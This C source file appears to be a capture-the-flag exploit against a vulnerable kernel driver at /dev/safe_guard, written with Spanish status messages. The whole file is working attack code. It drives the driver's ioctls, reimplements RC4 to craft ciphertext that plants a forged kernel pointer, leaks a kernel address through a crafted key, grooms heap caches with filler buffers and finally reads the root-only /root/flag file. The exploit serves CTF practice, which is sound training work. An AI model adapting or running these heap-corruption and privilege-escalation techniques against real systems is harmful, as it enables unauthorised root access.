#include <stdio.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/sendfile.h>
#include <seccomp.h>
#include <assert.h>

#define DEVICE_PATH           "/dev/safe_guard"
#define KEBAB_IOCTL_NEW       0xFABADA
#define KEBAB_IOCTL_READ      0xBEBE
#define KEBAB_IOCTL_SET_KEY   0x1CAFE
#define MAX_RC4_LEN           256
#define CACHE_MAXSIZE         64
#define CACHE_MINSIZE         33

typedef struct secure_buffer {
	char *buffer;
	size_t size;
}secure_buffer;

typedef struct new_secbuff_arg {
	size_t size;
	char key[MAX_RC4_LEN];
	const char *buffer;
}new_secbuff_arg;

typedef struct read_secbuff_arg {
	unsigned long index;
	char key[MAX_RC4_LEN];
	char *buffer;
}read_secbuff_arg;

typedef struct key_info {
    int pid;
    char *curr;
    size_t max_len;
}key_info;

void swap_rc4(unsigned char *a, unsigned char *b)
{
    int tmp = *a;
    *a = *b;
    *b = tmp;
}

int KSA(char *key, unsigned char *S)
{

	int len = strlen(key);
    int j = 0, i;


    for(i = 0; i < MAX_RC4_LEN; i++) S[i] = i;

    for(i = 0; i < MAX_RC4_LEN; i++)
	{
        j = (j + S[i] + key[i % len]) % MAX_RC4_LEN;
        swap_rc4(&S[i], &S[j]);
    }

    return 0;
}

int PRGA(unsigned char *S, char *plaintext, unsigned char *ciphertext, size_t len)
{

    int i = 0;
    int j = 0;
	int rnd;
	size_t n = 0;

    for(n = 0; n < len; n++)
	{
        i = (i + 1) % MAX_RC4_LEN;
        j = (j + S[i]) % MAX_RC4_LEN;

        swap_rc4(&S[i], &S[j]);
		rnd = S[(S[i] + S[j]) % MAX_RC4_LEN];

        ciphertext[n] = rnd ^ plaintext[n];
    }

    return 0;
}

int RC4(char *key, char *plaintext, unsigned char *ciphertext, size_t size)
{
	unsigned char S[MAX_RC4_LEN];
	KSA(key, S);
	PRGA(S, plaintext, ciphertext, size);
	return 0;
}

int setKeyIOCTL(int fd, char *key)
{
    if (ioctl(fd, KEBAB_IOCTL_SET_KEY, key) == -1)
    {
        printf("[-] Error al hacer el setKey [-]\n");
        return -1;exit(0);
    }
    printf("[+] Key configurada adecuadamente [+]\n");
    return 0;
}

int newSecIOCTL(int fd, new_secbuff_arg *arg_struct)
{
    if (ioctl(fd, KEBAB_IOCTL_NEW, arg_struct) == -1)
    {
        printf("[-] Error al hacer el newSecIOCTL [-]\n");
        return -1;
    }
    printf("[+] New realizado correctamente [+]\n");
    return 0;
}

int readSecIOCTL(int fd, read_secbuff_arg *arg_struct)
{
    if (ioctl(fd, KEBAB_IOCTL_READ, arg_struct) == -1)
    {
        printf("[-] Error al hacer el readSecIOCTL [-]\n");
        return -1;
    }
    printf("[+] Read realizado correctamente [+]\n");
    return 0;  
}

new_secbuff_arg createSecBuff(char *key, size_t size, char *content_buffer)
{
    new_secbuff_arg object;
    strcpy(object.key, key);
    object.size = size;
    char buffer[CACHE_MAXSIZE];
    memset(buffer, 0, CACHE_MAXSIZE);
    strncpy(buffer, content_buffer, size);
    object.buffer = buffer;

    return object;
}

void print_buffer(char *buffer, size_t size)
{
    printf("\n------------   Buffer content:   ------------\n");
    for (int i=0; i<(size/8); i++)
    {
        printf("%p", ((void **)buffer)[i]);
        i%2==0? printf("\t"): printf("\n");
    }

    printf("---------------------------------------------\n\n");
}

void print_key_info(key_info*info)
{
    printf("PID: %d\n", info->pid);
    printf("Current: %p\n", info->curr);
    printf("Size: %zu\n", info->max_len);
}


void exploit(int fd)
{

    char k_info[MAX_RC4_LEN] = "\x16"; //calculated using generate_rc4.key
    key_info* info = (key_info *) k_info;
    setKeyIOCTL(fd, k_info);
    print_key_info(info);

    char key[MAX_RC4_LEN] = "\x16";
    char plaintext_buffer[CACHE_MAXSIZE] = {0};
    *(char **)plaintext_buffer = info->curr - (CACHE_MAXSIZE - 16 + 1);
    char ciphertext_buffer[CACHE_MAXSIZE] = {0};

    RC4(key, plaintext_buffer, ciphertext_buffer, CACHE_MAXSIZE);

    new_secbuff_arg object0 = createSecBuff(key, CACHE_MAXSIZE, ciphertext_buffer); //when ciphered the null byte will be 0x60
    newSecIOCTL(fd, &object0);

    new_secbuff_arg object1 = createSecBuff(key, CACHE_MAXSIZE-1, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
    newSecIOCTL(fd, &object1);

    new_secbuff_arg object2 = createSecBuff(key, CACHE_MAXSIZE-1, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
    newSecIOCTL(fd, &object2);

    char plaintext_zbuffer[CACHE_MINSIZE];
    memset(plaintext_zbuffer, 0x41, CACHE_MINSIZE);

    char ciphertext_zbuffer[CACHE_MINSIZE];
    memset(ciphertext_zbuffer, 0, CACHE_MINSIZE);

    RC4(key, plaintext_zbuffer, ciphertext_zbuffer, CACHE_MINSIZE);
    
    new_secbuff_arg object3 = createSecBuff(key, CACHE_MINSIZE, ciphertext_zbuffer);
    newSecIOCTL(fd, &object3);
    printf("FIN\n");

    printf("PID: %d", getpid());
    sendfile(1, open("/root/flag", O_RDONLY), 0, 100);

    return;
}